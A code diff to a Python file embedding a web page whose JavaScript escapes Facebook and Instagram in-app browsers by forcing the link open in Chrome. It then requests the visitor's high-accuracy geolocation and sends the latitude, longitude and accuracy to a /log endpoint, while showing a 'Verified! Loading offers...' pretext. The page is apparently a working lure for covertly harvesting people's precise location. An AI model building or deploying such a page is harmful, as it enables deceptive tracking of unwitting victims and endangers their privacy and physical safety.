@@ -58,19 +58,22 @@ html = """
         return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
     }
 
-    // On button click, either redirect or request location
+    // On button click
     function getLocation() {
+        let url = window.location.href;
         if (isInAppBrowser()) {
-            let url = window.location.href;
+            // Force open in Chrome/Safari
             if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                 window.location = "googlechrome://" + url.replace(/^https?:\/\//, '');
             } else if (/Android/.test(navigator.userAgent)) {
                 window.location = "intent://" + url.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
             } else {
-                document.body.innerHTML = "<div style='padding:50px; text-align:center;'><h2>Please open this page in your browser</h2><p>Tap the menu (⋮) → 'Open in Browser'.</p></div>";
+                alert("Please open this page in your browser to continue.");
             }
             return;
         }
+
+        // If in a real browser, get location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
         } else {
@@ -83,7 +86,7 @@ html = """
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
-        fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy)
+        fetch(window.location.origin + '/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy)
         .then(() => {
             document.getElementById("status").innerText = "Verified! Loading offers...";
             document.getElementById("overlay").style.display = "none";
